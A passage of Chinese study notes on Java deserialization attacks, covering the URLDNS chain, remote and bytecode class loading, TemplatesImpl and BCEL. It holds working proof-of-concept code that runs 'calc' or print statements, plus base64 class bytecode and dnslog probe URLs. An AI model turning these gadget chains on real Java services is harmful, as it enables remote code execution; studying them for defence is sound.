        ObjectInputStream is = new ObjectInputStream(new FileInputStream("F:\\java_security\\security_01\\src\\main\\java\\org\\example\\d5_serializable\\obj.txt"));

        // 2、调用对象字节输入流的反序列化方法
        Student s = (Student) is.readObject();

        System.out.println(s);
    }
}
```

## 反序列化产生安全问题

**反序列化时调用readObject()方法**，以下情况可能产生安全问题：

```
1.入口类的readObject直接调用危险方法
2.入口类参数中包含可控类，该类有危险方法，readObject时调用
3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用
4.构造函数/静态代码块等类加载时隐式执行
```

针对上面的第一种情况，我们重写下 `Student` 类的 `readObject()` 方法。

当我们重写了 `readObject()`  方法时，系统会调用我们重写的 `readObject()`  方法而不是原生的，此目的是为了开发者更灵活的实现序列化反序列化的操作

```java
public class Student implements Serializable {
    //......
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject();
    Runtime.getRuntime().exec("calc");
}
    //...........
}
```

如上代码，再依次把 `Student` 对象序列化和反序列化，当我们反序列化时调用 `Student` 类中重写的 `readObject()` 方法 ，会发现执行了 `calc` 命令

<img src=".\图片\Snipaste_2023-02-27_15-02-20.png" alt="Snipaste_2023-02-27_15-02-20" style="zoom:80%;" />

## URLDNS链

URLDNS这条链子就是类似以下的情况：

2.入口类中包含可控类，该类有危险方法，readObject()时调用
3.入口类中包含可控类，该类又调用其它有危险方法的类，readObject()时调用

关于寻找反序列化漏洞，重点在于以下：

- 共同条件，实现Serializable接口


- 入口类 source :重写readObject()， 参数类型宽泛最好jdk自带，在readObject()里面调用常见函数（例如每个类都有的toString、equals、hashcode......）。 `Hashmap`->hash()->hashcode()


- 调用链 gadget chain ：相同名称 相同类型


- 执行类 sink  ：rce、ssrf、写文件等

### 入口类HashMap

HashMap类实现了`Serializable`接口， 且参数类型宽泛

<img src=".\图片\Snipaste_2023-02-28_13-46-27.png" alt="Snipaste_2023-02-28_13-46-27" style="zoom:80%;" />

HashMap 为了保证Key的唯一性，重写了`readObject()`方法，其中调用了参数为 key 的 `hash()` 方法，hash() 方法中是调用了 key 的`hashcode()` 方法。`readObject()->hash(key)->key.hashcode()`

<img src=".\图片\Snipaste_2023-02-28_13-50-22.png" alt="Snipaste_2023-02-28_13-50-22" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-02-28_13-51-20.png" alt="Snipaste_2023-02-28_13-51-20" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-02-28_13-55-32.png" alt="Snipaste_2023-02-28_13-55-32" style="zoom:80%;" />

### 执行类与调用链

执行类 sink  ：rce、ssrf、写文件等

当我们寻找利用链上的类时，假如其重写了hashcode()、toString、equals()这些常规方法....，而这些被重写的方法中有些另外的危险函数，而且这个类实现了 `Serializable` 接口，那么这个类可能是利用链上的类

就是相同类型同名的函数套娃调用

再回到我们找**执行类**`URL`这里：

`URL`类实现了 `Serializable` 接口

<img src=".\图片\Snipaste_2023-02-28_14-23-46.png" alt="Snipaste_2023-02-28_14-23-46"  />

在URL类中**找通用函数时**发现了`hashcode()`函数，其中调用了`URLStreamHandler` 类中的 `hashCode` 方法，这个 `hashCode` 方法里调用的 `getHostAddress()` 方法是发起一个 http 请求。

```
URL.hashcode()->URLStreamHandler.hashcode()->getHostAddress()
```

<img src=".\图片\Snipaste_2023-02-28_14-39-34.png" alt="Snipaste_2023-02-28_14-39-34" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-02-28_14-40-04.png" alt="Snipaste_2023-02-28_14-40-04" style="zoom:80%;" />

#### 问题初现

于是我们初步尝试，先序列化，**预想接着反序列化时会触发DNS请求**

```java
@Test
public void test() throws IOException {
    URL url =new URL("http://tj0rt6.dnslog.cn");
    HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();//这里URL的hashCode=-1
    hashMap.put(url,1);//保证键的唯一性，这里URL的hashCode != -1
    ser(hashMap);  //自己写的序列化函数
}
```

我们还没来得及反序列化，在序列化的过程中便触发了请求，而我们再执行反序列化时却没有发生请求。

<img src=".\图片\Snipaste_2023-02-28_14-48-58.png" alt="Snipaste_2023-02-28_14-48-58"  />

##### 原因

1、在序列化的过程中便触发了请求，原因是，在 hashMap.put() 时，调用了参数key为 url 的 hash() 方法从而调用了其中的  url.hashcode() 方法，从而y一步步调用了 getHostAddress() 方法

```
hashMap.put(url，1)->hash(url)->url.hashcode()->getHostAddress()
```

<img src=".\图片\Snipaste_2023-02-28_15-08-44.png" alt="Snipaste_2023-02-28_15-08-44" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-02-28_15-09-08.png" alt="Snipaste_2023-02-28_15-09-08" style="zoom:80%;" />

2、再执行反序列化时却没有发生请求，原因是，在调用 URL 类里的 hashcode() 方法时，**之前put方法改变了初始化等于-1的hashcode的值**使 `hashCode != -1`  ，所以直接返回了hashcode的值，无法绕过 if 语句执行 `url.hashcode()` 从而最终执行到 `URLStreamHandler.hashcode->getHostAddress()`

<img src=".\图片\Snipaste_2023-02-28_15-22-05.png" alt="Snipaste_2023-02-28_15-22-05" style="zoom: 80%;" />

#### 解决

```java
@Test
public void test() throws IOException {
        URL url =new URL("http://xxa1bx.dnslog.cn");
        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();//这里URL的hashCode=-1
        //这里不要改变请求，把hashcode的值改为 !=-1 的其它值
        hashMap.put(url,1);
        //这里把hashcode的值改为 -1
        ser(hashMap);  //自己写的序列化函数
}
```

**通过反射动态修改URL类中的成员变量hashcode**

```java
public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        URL url =new URL("http://xxa1bx.dnslog.cn");
        Class u = url.getClass();
        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();//这里URL的hashCode=-1

        Field f1 = u.getDeclaredField("hashCode");
        f1.setAccessible(true);
        f1.set(url,2);//hashCode改为2

        hashMap.put(url,2);//这个value的2为多少无所谓
    
        f1.set(url,-1);//hashCode改为-1
        ser(hashMap); //自己写的序列化函数
    }
```

此时再把已经序列化的文件反序列化，按照我们预想的发生了请求，以下为完整代码

```java
package org.example.bilibili_dreamer;
import org.junit.Test;
import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class TestSer {
    public static void ser(Object o) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("F:\\java_security\\ser1.bin"));
        oos.writeObject(o);
    }
    
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        URL url =new URL("http://vraajl.dnslog.cn");
        Class u = url.getClass();
        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();//这里URL的hashCode=-1

        Field f1 = u.getDeclaredField("hashCode");
        f1.setAccessible(true);
        f1.set(url,2);//hashCode改为2

        hashMap.put(url,2);//这个value的2为多少无所谓
        
        f1.set(url,-1);//hashCode改为-1
        ser(hashMap);

//        URL url =new URL("http://xxa1bx.dnslog.cn");
//        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();//这里URL的hashCode=-1
//        //这里不要改变请求把hashcode的值改为 !=-1 的其它值
//        hashMap.put(url,1);
//        //这里把hashcode的值改为 -1
//        ser(hashMap);  //自己写的序列化函数
    }

}
```

```java
package org.example.bilibili_dreamer;
import java.io.*;
public class TestUnser {
    public static Object unser() throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("F:\\java_security\\ser1.bin"));
        Object obj = ois.readObject();
        System.out.println(obj);
        return obj;
    }
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        unser();
    }
}
```

## 反射在反序列化中的作用

- 定制需要的对象
- 通过invoke()方法调用除了同名方法之外的方法   A.readObject()->invoke() ->B.f()
- 通过Class类创建对象，调用不能序列化的类

# 拓展其它

## 动态代理

<img src=".\图片\Snipaste_2023-02-19_21-45-19.png" alt="Snipaste_2023-02-19_21-45-19" style="zoom:80%;" />

动态代理的优点：

- 非常的灵活，支持任意接口类型的实现类对象做代理，也可以直接为接本身做代理。

- 可以为被代理对象的所有方法做代理。

- 可以在不改变方法源码的情况下，实现对方法功能的增强。

- 不仅简化了编程工作、提高了软件系统的可扩展性，同时也提高了开发效率。

例子：

```java
package com.zf1yolo.day20.d9_proxy;

/**
   模拟用户业务功能
 */
public interface UserService {
    String login(String loginName, String passWord) ;
    void selectUsers();
    boolean deleteUsers();
    void updateUsers();
}
```

```java
package com.zf1yolo.day20.d9_proxy;

public class UserServiceImpl implements UserService{
    @Override
    public String login(String loginName, String passWord)  {
        try {
            Thread.sleep(1000);
        } catch (Exception e) {
            e.printStackTrace();
        }
        if("admin".equals(loginName) && "1234".equals(passWord)) {
            return "success";
        }
        return "登录名和密码可能有毛病";

    }

    @Override
    public void selectUsers() {
        System.out.println("查询了100个用户数据！");
        try {
            Thread.sleep(2000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public boolean deleteUsers() {
        try {
            System.out.println("删除100个用户数据！");
            Thread.sleep(500);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    @Override
    public void updateUsers() {
        try {
            System.out.println("修改100个用户数据！");
            Thread.sleep(2500);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```java
package com.zf1yolo.day20.d9_proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
/**
    public static Object newProxyInstance(ClassLoader loader,  Class<?>[] interfaces, InvocationHandler h)
    参数一：类加载器，负责加载代理类到内存中使用。
    参数二：获取被代理对象实现的全部接口。代理要为全部接口的全部方法进行代理
    参数三：代理的核心处理逻辑
 */
public class ProxyUtil {
    /**
      生成业务对象的代理对象。
     * @param obj
     * @return
     */
    public static <T> T  getProxy(T obj) {
        // 返回了一个代理对象了
        return (T)Proxy.newProxyInstance(obj.getClass().getClassLoader(),
                obj.getClass().getInterfaces(),
                new InvocationHandler() {
                    @Override
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        // 参数一：代理对象本身。一般不管
                        // 参数二：正在被代理的方法
                        // 参数三：被代理方法，应该传入的参数
                       long startTimer = System .currentTimeMillis();
                        // 马上触发方法的真正执行。(触发真正的业务功能)
                        Object result = method.invoke(obj, args);

                        long endTimer = System.currentTimeMillis();
                        System.out.println(method.getName() + "方法耗时：" + (endTimer - startTimer) / 1000.0 + "s");

                        // 把业务功能方法执行的结果返回给调用者
                        return result;
                    }
                });
    }
}
```

```java
package com.zf1yolo.day20.d9_proxy;

public class Test {
    public static void main(String[] args) {
        // 1、把业务对象，直接做成一个代理对象返回，代理对象的类型也是 UserService类型
        UserService userService = ProxyUtil.getProxy(new UserServiceImpl());
        System.out.println(userService.login("admin", "1234"));
        System.out.println(userService.deleteUsers());
        userService.selectUsers();
        userService.updateUsers(); // 走代理
    }
}
```

```
login方法耗时：1.012s
success
删除100个用户数据！
deleteUsers方法耗时：0.501s
true
查询了100个用户数据！
selectUsers方法耗时：2.012s
修改100个用户数据！
updateUsers方法耗时：2.508s
```

## 类的动态加载 一

[反射机制之类加载](https://mp.weixin.qq.com/s?__biz=MzkzMjIxNjExNg==&mid=2247484556&idx=1&sn=2f7080548153bf952b3b270d3574f30e&chksm=c25e68d7f529e1c1d86fd5832c43610faa0c1a861c9e729f6039fb82e79263d21e83e9e7957e&cur_album_id=2526790998061006849&scene=190#rd)     [Java类加载机制和对象创建过程](https://segmentfault.com/a/1190000023876273)   [白日梦组长](https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=f21386f67860beb8cb1ded310d802d3f)  [双亲委派模型](https://juejin.cn/post/6844903838927814669)

1、类加载与反序列化

​      类加载的时候会执行代码

​      **初始化**：静态代码块

​      **实例化**：构造代码块，构造函数

2、动态类加载方法

- Class.forname()   可初始化可不初始化

```java
Class forName(String name) //默认初始化
Class forName(String name, boolean initialize, ClassLoader loader)  //initialize 为 false 时不初始化
```

- ClassLoader.Loadclass  不进行初始化

​        **底层原理：实现加载任意的类**

​        继承关系：ClassLoader->SecureClassLoader->URLClassLoader->AppClassLoader

​        调用关系：loadClass()->findClass(重写的方法)->defineClass(从字节码加载)

​        **URLClassLoader()** 任意类的加载 file/http/jar

- **ClassLoader.defineClass()** 字节码加载任意类 私有
  Unsafe.defineClass() 字节码加载 public 类不能直接生成 Spring里可以直接生成

### 例子

简简单单Person类

```java
package org.example.bilibili_dreamer;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable {
    //    private static final long serialVersionUID = 1L;
    public String name;
    private int age;
    public static int id;

    static {
        System.out.println("静态代码块");
    }

    public static void staticAction() {
        System.out.println("静态方法");
    }

    {
        System.out.println("构造代码块");
    }

    public Person() {
        System.out.println("Person无参构造方法");
    }

    public Person(String name, int age) {
        System.out.println("Person有参构造方法");
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }

    private void action(String act) {
        System.out.println(act);
    }

 /*   private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        Runtime.getRuntime().exec("calc");
    }*/
}
```

#### 测试

<img src=".\图片\Snipaste_2023-03-02_19-54-48.png" alt="Snipaste_2023-03-02_19-54-48" style="zoom:80%;" />

1、实例化（使用）时，初始化时的方法也都调用了

```java
 @Test
    public void test01() {
        new Person();
//        静态代码块
//        构造代码块
//        Person无参构造方法
    }
```

2、直接用类调用静态方法时，对类进行操作，调用的是与类相关的方法

```java
  @Test
    public void test02() {
        Person.staticAction();
//        静态代码块
//        静态方法
    }
```

3、类初始化时会调用静态代码块


```java
@Test
public void test03() {
    Person.id = 2;
    //静态代码块
}
```

4、用 Person.class 获取Class 对象时不会进行初始化，没有打印任何东西

```java
@Test
public void test04() {
    Class<Person> personClass = Person.class;  //
}
```

5、使用 Class.forName(className) 方法默认会进行初始化


```java
@Test
public void test05() throws ClassNotFoundException {
   Class.forName("org.example.bilibili_dreamer.Person");
   //静态代码块
}
```

6、使用 Class.forName(className, false, currentLoader) 时就不会进行初始化

```java
@Test
public void test06() throws ClassNotFoundException {
    Class.forName("org.example.bilibili_dreamer.Person", false, ClassLoader.getSystemClassLoader());
}
```

7、ClassLoader 调用 loadClass方法  不会进行初始化 ，AppClassLoader@14dad5dc 类加载器是双亲委派中的模型

**底层原理：实现加载任意的类**

继承关系：ClassLoader->SecureClassLoader->URLClassLoader->AppClassLoader

调用关系：loadClass()->findClass(重写的方法)->defineClass(从字节码加载)

URLClassLoader() 任意类的加载 file/http/jar

<img src=".\图片\Snipaste_2023-03-02_20-38-39.png" alt="Snipaste_2023-03-02_20-38-39" style="zoom:67%;" />

```java
@Test
public void test07() throws ClassNotFoundException, IllegalAccessException, InstantiationException {
    ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
    System.out.println(systemClassLoader); //sun.misc.Launcher$AppClassLoader@14dad5dc
    Class<?> c = systemClassLoader.loadClass("org.example.bilibili_dreamer.Person");//loadClass不进行初始化
    c.newInstance();//实例化时输出打印：静态代码块 构造代码块 Person无参构造方法
}
```

8、使用 `URLClassLoader()` 来任意类的加载，利用其加载其它的路径下的class文件。我们新建一个TestCalc的类（**静态代码块中放命令执行calc的代码**），编译并把TestCalc.class 文件移动在其它路径下，再删除原路径TestCalc.java文件，然后用 URLClassLoader() 来加载 TestCalc.class，最后发现弹出来计算器

```java
@Test
public void test08() throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException {
    URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("file:///D:\\resources\\classes\\")});
    Class<?> testCalc = urlClassLoader.loadClass("org.example.bilibili_dreamer.TestCalc"); //loadClass不进行初始化。并且此处有问题，不能写org.example.bilibili_dreamer.TestCalc，而是直接写 TestCalc
    testCalc.newInstance();
}
```

​       **出现问题一**：当我们路径写的是 `org.example.bilibili_dreamer.TestCalc` 时，jvm 会找本包target下的      org.example.bilibili_dreamer 包下的 `TestCalc.class` 文件，如果我们移走 TestCalc.class 到其它路径下，它会爆异常。如果我们不移走原来的 TestCalc.class 文件，那么就达不到期望效果。所以我们直接写名称 `loadClass("TestClac")`

​       **出现问题二**：名称直接写 `loadClass("TestCalc")` 时，依然可能报异常，因为我们 `TestCalc.java` 里的第一行是 `package XXX.XXX;` ，正确写法是不加 `package` 并且到工程以外的地方新建  `TestCalc.java` 

​       **出现问题三**：用 `javac TestCalc.java`  命令时注意 java 的版本号得与测试环境的版本号相同，否则依然爆异常

9、`new URLClassLoader(new URL[]{new URL("file:///D:\\resources\\classes\\")})`  不仅可以使用 file 协议，也可以使用 http 协议远程调用，依然可以弹出计算器

```java
@Test
public void test09() throws IllegalAccessException, InstantiationException, ClassNotFoundException, MalformedURLException {
    URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://localhost:8765/")});
    Class<?> testCalc = urlClassLoader.loadClass("TestCalc"); //loadClass不进行初始化
    testCalc.newInstance();
}
```

<img src=".\图片\Snipaste_2023-03-02_22-18-54.png" alt="Snipaste_2023-03-02_22-18-54" style="zoom:67%;" />

10、使用 jar 协议 ，jar命令是  `jar -cvf TestCalc.jar TestCalc.class`

```java
@Test
public void test10() throws IllegalAccessException, InstantiationException, ClassNotFoundException, MalformedURLException {
    URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:file:///D:\\resources\\classes\\TestCalc.jar!/")});
    // 也可以使用 jar:http://localhost:8765/TestCalc.jar!/
    Class<?> testCalc = urlClassLoader.loadClass("TestCalc"); //loadClass不进行初始化
    testCalc.newInstance();
}
```

11、ClassLoader.defineClass() 字节码加载任意类 私有，利用反射调用执行`ClassLoader`类里的`defineClass`方法，从而从别的路径加载 `TestCalc.class` 字节码文件，最后实例化执行了计算器

这个方法可以不出网，我们直接把 TestCalc.class 字节码文件传到服务器

<img src=".\图片\Snipaste_2023-03-02_22-47-12.png" alt="Snipaste_2023-03-02_22-47-12" style="zoom:67%;" />

```java
@Test
public void test11() throws NoSuchMethodException, IOException, IllegalAccessException, InstantiationException, InvocationTargetException {
    ClassLoader cl = ClassLoader.getSystemClassLoader();
    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    defineClass.setAccessible(true);
    byte[] code = Files.readAllBytes(Paths.get("D:\\resources\\classes\\TestCalc.class"));
    Class c = (Class) defineClass.invoke(cl, "TestCalc", code, 0, code.length);
    c.newInstance();
}
```

12、Unsafe.defineClass() 字节码加载，public 类不能直接生成，Spring里可以直接生成，还是利用反射调用

```java
@Test
public void test12() throws NoSuchFieldException, IllegalAccessException, IOException, InstantiationException {
    ClassLoader cl = ClassLoader.getSystemClassLoader();
    Class<Unsafe> unsafeClass = Unsafe.class;
    Field f = unsafeClass.getDeclaredField("theUnsafe");
    f.setAccessible(true);
    Unsafe u = (Unsafe)f.get(null);
    byte[] code = Files.readAllBytes(Paths.get("D:\\resources\\classes\\TestCalc.class"));
    Class<?> c = (Class) u.defineClass("TestCalc", code, 0, code.length, cl, null);
    c.newInstance();
}
```

## 动态加载字节码 二

### ClassLoader#defineClass

上一节中我们认识到了如何利用 URLClassLoader 加载远程class文件，也就是字节码。其实，不管是加载远程class文件，还是本地的class 或 jar 文件，Java 都经历的是下面这三个方法调用：

<img src=".\图片\Snipaste_2023-03-06_12-46-34.png" alt="Snipaste_2023-03-06_12-46-34" style="zoom:80%;" />

其中：

- `loadClass` 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass

- `findClass` 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass

- `defineClass` 的作用是处理前面传入的字节码，将其处理成真正的Java类

所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。

我们可以编写一个简单的代码，来演示如何让系统的 defineClass 来直接加载字节码：

```java
 @Test
    public void test10() throws InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchMethodException {
        Method defineClass =
                ClassLoader.class.getDeclaredMethod("defineClass", String.class,
                        byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        //code 是 javac 编译后的字节吗
        byte[] code =              Base64.getDecoder().decode("yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM");
                        Class hello =
                                (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "Hello", code,
                                        0, code.length);
        hello.newInstance();
    }
```

输出了 `Hello World`

注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中（在本系列文章第一篇 中进行过说明），在 defineClass 时也无法被直接调用到。所以，如果我们要使用 defineClass 在目 标机器上执行任意代码，需要想办法调用构造函数。

这里，因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。 在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我 们常用的一个攻击链 `TemplatesImpl` 的基石。

### TemplatesImpl

虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它（否则他 也没存在的价值了对吧），这就是 TemplatesImpl 。

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 这个类中定义了一个内部类 TransletClassLoader ：

```java
static final class TransletClassLoader extends ClassLoader {
    private final Map<String,Class> _loadedExternalExtensionFunctions;
     TransletClassLoader(ClassLoader parent) {
         super(parent);
        _loadedExternalExtensionFunctions = null;
    }
    TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
        super(parent);
        _loadedExternalExtensionFunctions = mapEF;
    }
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> ret = null;
        // The _loadedExternalExtensionFunctions will be empty when the
        // SecurityManager is not set and the FSP is turned off
        if (_loadedExternalExtensionFunctions != null) {
            ret = _loadedExternalExtensionFunctions.get(name);
        }
        if (ret == null) {
            ret = super.loadClass(name);
        }
        return ret;
     }
    /**
     * Access to final protected superclass member from outer class.
     */
    Class defineClass(final byte[] b) {
        return defineClass(null, b, 0, b.length);
    }
}
```

这个类里重写了 `defineClass` 方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为 `default`。所以也就是说这里的 defineClass 由其父类的 protected类型变成了一个default类型的方法，可以被类外部调用。

我们从 TransletClassLoader#defineClass() 向前追溯一下调用链：

```
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->
TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()
-> TransletClassLoader#defineClass()
```

追到最前面两个方法 TemplatesImpl#getOutputProperties() 、 TemplatesImpl#newTransformer() ，这两者的作用域是public，可以被外部调用。我们尝试用 newTransformer() 构造一个简单的POC：

```java
@Test
    public void test11() throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException {
// source: bytecodes/HelloTemplateImpl.java
        byte[] code =              Base64.getDecoder().decode("yv66vgAAADQAJgoACAAVCQAWABcIABgKABkAGggAGwgAHAcAHQcAHgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAfAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwAEAARBwAgDAAhACIBABjosIPnlKjkuobmma7pgJrku6PnoIHlnZcHACMMACQAJQEAFeiwg+eUqOaXoOWPguaehOmAoOWZqAEAGOiwg+eUqOS6humdmeaAgeS7o+eggeWdlwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABwAIAAAAAAAEAAEACQAKAAIACwAAABkAAAADAAAAAbEAAAABAAwAAAAGAAEAAAALAA0AAAAEAAEADgABAAkADwACAAsAAAAZAAAABAAAAAGxAAAAAQAMAAAABgABAAAAEAANAAAABAABAA4AAQAQABEAAQALAAAAOQACAAEAAAAVKrcAAbIAAhIDtgAEsgACEgW2AASxAAAAAQAMAAAAEgAEAAAAGgAEABcADAAbABQAHAAIABIAEQABAAsAAAAlAAIAAAAAAAmyAAISBrYABLEAAAABAAwAAAAKAAIAAAATAAgAFAABABMAAAACABQ=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        obj.newTransformer();
    }
    public static void setFieldValue(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException {
        Class<?> clazz = obj.getClass();
        Field fieldName = clazz.getDeclaredField(field);
        fieldName.setAccessible(true);
        fieldName.set(obj,value);
    }
```

<img src=".\图片\Snipaste_2023-03-06_13-32-01.png" alt="Snipaste_2023-03-06_13-32-01" style="zoom:80%;" />

其中， setFieldValue 方法用来设置私有属性，可见，这里我设置了三个属性： _bytecodes 、 _name 和 _tfactory 。 _bytecodes 是由字节码组成的数组； _name 可以是任意字符串，只要不为null即可； 

_tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是null会出错。

另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。

**所以，我们需要构造一个特殊的代码执行类：**

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Test extends AbstractTranslet {
   @Override
   public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

  }

   @Override
   public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
       
  }
   
   static {
       System.out.println("调用了静态代码块");
  }
   
  {
       System.out.println("调用了普通代码块");
  }

   public Test() {
       System.out.println("调用无参构造器");
  }
}
```

注意：**将其使用javac编译，再base64编码，放入以上POC的 code 中**

### BCEL ClassLoader

 BCEL ClassLoader这是一个特殊的类加载器，因为它会加载类名是$$BCEL$$开头的类

我们可以通过BCEL提供的两个类 Repository 和 Utility 来利用： Repository 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将 原生的字节码转换成BCEL格式的字节码：

#### 使用步骤：

（1）先使用Repository.lookupClass()将一个java类转换为字节码，再使用Utility.encode()将其编码为特殊字节码。

编写的java类：

```java
import java.io.IOException;

public class Evil {
   static{
       try {
           Runtime.getRuntime().exec("calc");
      } catch (IOException e) {
           e.printStackTrace();
      }
  }
}
```

转化为特殊字节码：

```java
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.IOException;

public class BCEL_ByteCode {
   public static void main(String[] args) throws IOException {
       JavaClass cls = Repository.lookupClass(Evil.class);
       String code = Utility.encode(cls.getBytes(), true);
       System.out.println(code);
  }
}
```

运行结果：

```
